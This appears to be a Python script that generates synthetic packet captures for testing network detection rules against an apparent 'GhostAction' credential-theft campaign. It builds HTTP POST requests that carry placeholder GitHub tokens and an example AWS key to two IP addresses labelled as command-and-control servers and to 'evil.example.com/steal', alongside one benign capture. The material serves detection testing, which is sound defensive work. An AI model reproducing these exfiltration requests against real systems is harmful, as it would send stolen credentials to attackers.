#!/usr/bin/env python3
"""
Synthetic HTTP/1.1 PCAPs for GhostAction credential-theft campaign.

attack-c2-oct2026.pcap : POST to 193.32.204.199 carrying GITHUB_TOKEN -> 2026102101.
attack-c2-2025.pcap    : POST to 45.139.104.115 carrying exfil data   -> 2026102102.
attack-token-exfil.pcap: POST with GITHUB_TOKEN + ghp_ prefix to generic host -> 2026102103.
benign-api-call.pcap   : normal POST to an internal API, no C2 indicators -> clean.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _lib.h2c_http_helper import build_pcap


def http_post(host, path, body):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: curl/8.7.1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
    ).encode("latin-1")


def http_200():
    b = b'{"ok":true}'
    return (
        b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
        b"Content-Length: %d\r\n\r\n" % len(b)
    ) + b


EXFIL_OCT2026 = "token=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&repo=victim/repo&GITHUB_TOKEN=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
EXFIL_2025 = "token=ghp_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&repo=target/app"
EXFIL_GENERIC = "GITHUB_TOKEN=ghp_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&aws_key=AKIAIOSFODNN7EXAMPLE"
BENIGN_BODY = "action=build&ref=main&status=success"


def main():
    here = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcaps")
    build_pcap(
        f"{here}/attack-c2-oct2026.pcap",
        [http_post("193.32.204.199", "/collect", EXFIL_OCT2026)],
        [http_200()],
        server_ip="193.32.204.199",
    )
    build_pcap(
        f"{here}/attack-c2-2025.pcap",
        [http_post("45.139.104.115", "/exfil", EXFIL_2025)],
        [http_200()],
        server_ip="45.139.104.115",
    )
    build_pcap(
        f"{here}/attack-token-exfil.pcap",
        [http_post("evil.example.com", "/steal", EXFIL_GENERIC)],
        [http_200()],
    )
    build_pcap(
        f"{here}/benign-api-call.pcap",
        [http_post("ci.internal.example.com", "/api/status", BENIGN_BODY)],
        [http_200()],
    )
    print("wrote 3 attack + 1 benign pcaps (ghostaction)")


if __name__ == "__main__":
    main()
